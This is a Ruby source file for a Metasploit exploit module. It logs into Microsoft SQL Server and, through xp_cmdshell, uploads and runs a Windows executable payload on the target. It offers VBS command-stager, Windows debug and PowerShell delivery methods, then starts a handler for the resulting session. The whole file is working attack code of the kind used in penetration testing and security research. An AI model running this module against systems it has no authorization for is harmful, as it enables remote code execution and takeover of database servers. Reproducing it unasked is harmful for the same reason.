##
# $Id: mssql_payload.rb 9375 2010-05-26 22:39:56Z rel1k $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::MSSQL
	include Msf::Exploit::CmdStagerVBS
	#include Msf::Exploit::CmdStagerDebugAsm
	#include Msf::Exploit::CmdStagerDebugWrite
	#include Msf::Exploit::CmdStagerTFTP

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server Payload Execution',
			'Description'    => %q{
					This module will utilize multiple methods in payload delivery on a given system all through MSSQL. JDuck's method will utilize wscript in order to execute the initial stager. ReL1K's method will utilize either Windows Debug which is currently installed on anything pre Windows 7 and utilize binary to hex conversion methods. ReL1K's newest method can utilize powershell for the conversion methods and can only be used on Server 2008 and Windows 7 based systems or with other systems that have installed powershell.
			},
			'Author'         => [ 'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>', 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9563 $',
			'References'     =>
				[
					[ 'CVE', '2000-1209' ],
					[ 'CVE', '2000-0402' ],
					[ 'OSVDB', '557' ],
					[ 'OSVDB', '4787' ],
					[ 'BID', '1281' ],
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
			))
		register_options(
			[
				OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ]),
				OptBool.new('UseCmdStager', [ false, "Wait for user input before returning from exploit", true ]),
				OptBool.new('UseWinDebug',[ false, "Use Windows debug for payload conversion, 2k3 and below only", false]),
				OptBool.new('UsePowerShell',[ false, "Use PowerShell for the payload conversion on Server 2008 and Windows 7", false]),
			])
	end

	# This is method required for the CmdStager to work...
	def execute_command(cmd, opts)
		mssql_xpcmdshell(cmd, datastore['VERBOSE'])
	end

	def exploit

		if (not mssql_login_datastore)
			print_status("Invalid SQL Server credentials")
			return
		end

		if (not mssql_login_datastore)
			print_status("Invalid SQL Server credentials")
			return
		end

		# Use Windows debug method for payload delivery
		if (datastore['UseWinDebug'])
				mssql_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))

		# Use powershell method for payload delivery
		elsif (datastore['UsePowerShell'])
			powershell_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))

		# Use the CmdStager or not?
		elsif (not datastore['UseCmdStager'])
			exe = generate_exe
			mssql_upload_exec(exe, datastore['VERBOSE'])
		else
			execute_cmdstager({ :linemax => 1500, :nodelete => true })
			#execute_cmdstager({ :linemax => 1500 })
		end

		handler
		disconnect
	end

end
